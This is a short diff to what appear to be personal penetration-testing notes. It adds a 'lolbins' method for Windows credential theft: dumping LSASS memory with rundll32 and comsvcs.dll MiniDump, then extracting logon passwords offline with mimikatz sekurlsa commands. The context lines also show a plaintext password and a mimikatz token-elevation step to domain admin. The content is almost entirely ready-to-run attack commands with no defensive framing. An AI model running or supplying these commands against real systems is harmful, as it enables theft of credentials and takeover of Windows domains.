@@ -28,3 +28,24 @@ pw:12qwaszx!@QWASZX
 
 8. Elevate
 `mimkatz # token::elevate /domainadmin`
+
+
+## Other way lolbins
+1. in an local admin powershell:
+```
+get-process lsass
+
+rundll32.exe c:\Windows\system32\comsvcs.dll, MiniDump <pid> C:\Windows\temp\mini.dump full
+```
+
+2. In mimikatz (this can be done "offline")
+```
+mimikatz # sekurlsa::minidump lsass.dmp
+mimikatz # sekurlsa::logonPasswords full
+
+```
+
+
+
+
+
